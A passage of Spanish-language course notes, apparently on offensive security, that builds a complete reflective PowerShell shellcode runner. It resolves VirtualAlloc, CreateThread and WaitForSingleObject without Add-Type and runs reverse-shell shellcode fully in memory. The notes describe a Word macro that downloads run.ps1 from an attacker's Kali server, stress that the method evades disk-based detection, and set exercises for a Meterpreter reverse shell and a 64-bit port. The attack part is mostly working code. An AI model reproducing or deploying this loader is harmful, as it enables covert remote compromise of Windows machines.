$MyMethodBuilder = $MyTypeBuilder.DefineMethod(
  'Invoke', 
  'Public, HideBySig, NewSlot, Virtual', 
    [UInt32], 
      @([String], [UInt32])) 
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')

$MyDelegateType = $MyTypeBuilder.CreateType()

# 3. Enlazar y ejecutar WinExec
$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WinExec, $MyDelegateType)

# Invocamos: "notepad.exe" como comando, y 1 como SW_SHOWNORMAL
Write-Host "[*] Lanzando Notepad..." -ForegroundColor Cyan
$MyFunction.Invoke("notepad.exe", 1)
```

🔍 ¿Por qué funciona?
Al cambiar el array de tipos en DefineConstructor y DefineMethod a @([String], [UInt32]), le estamos diciendo a .NET exactamente cómo debe empaquetar los argumentos cuando llame a la dirección de memoria de WinExec. Si pones los tipos incorrectos (por ejemplo, [IntPtr] en lugar de [String]), el script fallará o crasheará PowerShell.

¡Con esto completas los tres ejercicios! Ahora ya sabes cómo ejecutar cualquier API de Windows en memoria sin tocar el disco y sin usar Add-Type.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5240898f-0616-4327-b0fa-be26a6590463" />

## Shellcode Runner completo y funcional que se ejecuta 100% en memoria.

La clave de este texto es que ya no vamos a ejecutar un simple MessageBoxA. Ahora vamos a usar VirtualAlloc, CreateThread y WaitForSingleObject usando la reflexión. Además, introducen una optimización importante para hacer el código más limpio y reutilizable.

Aquí te explico los puntos clave de este texto:

1. La función getDelegateType (Listing 89)
En los ejemplos anteriores, cada vez que queríamos llamar a una API, teníamos que escribir todo el bloque de código para crear el "molde" del delegado (DefineDynamicAssembly, DefineType, DefineConstructor, etc.). Eso era muy repetitivo.

Para solucionarlo, el autor convierte todo ese código en una función reutilizable llamada getDelegateType.

Recibe como parámetros: $func (el array de tipos de argumentos) y $delType (el tipo de retorno, que por defecto es [Void]).

Devuelve el objeto $type.CreateType(), que es el molde listo para usar.

2. La llamada a VirtualAlloc (Listing 90 y 91)
Ahora usan LookupFunc para obtener la dirección de VirtualAlloc y getDelegateType para crear el molde. Luego, con GetDelegateForFunctionPointer, los unen y lo invocan.

El texto muestra una versión condensada (Listing 91) que elimina las variables intermedias. Todo se hace en una sola línea:
```
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
```

0x1000: Tamaño del buffer a reservar (4096 bytes).

0x3000: MEM_COMMIT | MEM_RESERVE.

0x40: PAGE_EXECUTE_READWRITE (RWX).

Devuelve $lpMem, un puntero a la memoria asignada.

3. Copiar el Shellcode (Listing 92)
El shellcode debe ser de 32 bits (windows/shell_reverse_tcp), porque Word lanza un proceso de PowerShell de 32 bits.
```[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0... # Tu shellcode completo
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
```

Esta función de .NET copia el array de bytes directamente a la dirección de memoria que reservamos ($lpMem). No hay bucles For como en VBA; es una copia directa en memoria.

4. Ejecutar el Hilo y Mantenerlo Vivo (Listing 93)
Aquí ocurren los últimos pasos:

CreateThread: Se resuelve y se llama usando el mismo método reflectivo. Se le pasa $lpMem como dirección de inicio. Esto lanza el shellcode en un nuevo hilo. Devuelve un manejador de hilo ($hThread).

WaitForSingleObject: Esta es la parte nueva y crucial. Si no la usamos, PowerShell terminaría inmediatamente después de lanzar el hilo, cerrando la conexión de la reverse shell. WaitForSingleObject le dice a PowerShell: "Pausa tu ejecución y espera a que este hilo termine". Como el hilo de la shell nunca termina (hasta que cierras la conexión), PowerShell se queda vivo, manteniendo la shell abierta.

5. Integración con Word (La parte final del texto)
El texto menciona que no necesitas actualizar la macro de Word.

La macro de Word ahora solo necesita descargar un archivo run.ps1 desde tu servidor de Kali y ejecutarlo con PowerShell.

El run.ps1 contiene todo este código de reflexión.

Esto es mucho más sigiloso porque el shellcode no está dentro del documento de Word, sino en un script alojado en tu servidor, y se ejecuta en memoria sin tocar el disco.

6. Verificación con Process Monitor (Figura 27)
El texto enfatiza que, al usar ProcMon, puedes verificar que NO se escribe ningún archivo .cs en el disco y NO se lanza el compilador csc.exe. Esto es lo que diferencia esta técnica de la versión con Add-Type. Todo el proceso de creación del delegado ocurre en la memoria RAM.

```
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)


```




Exercises
- Generate a Meterpreter shellcode and obtain an in-memory PowerShell shellcode runner resulting in a reverse shell.
- The code developed in this section was based on a 32-bit PowerShell process. Identify and modify needed elements to make this work from a 64-bit PowerShell process -> Cambia [UInt32] por [UIntPtr] o [UInt64] en los argumentos de tamaño.


<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b8157dca-5205-4fa5-8f8b-63841a403743" />
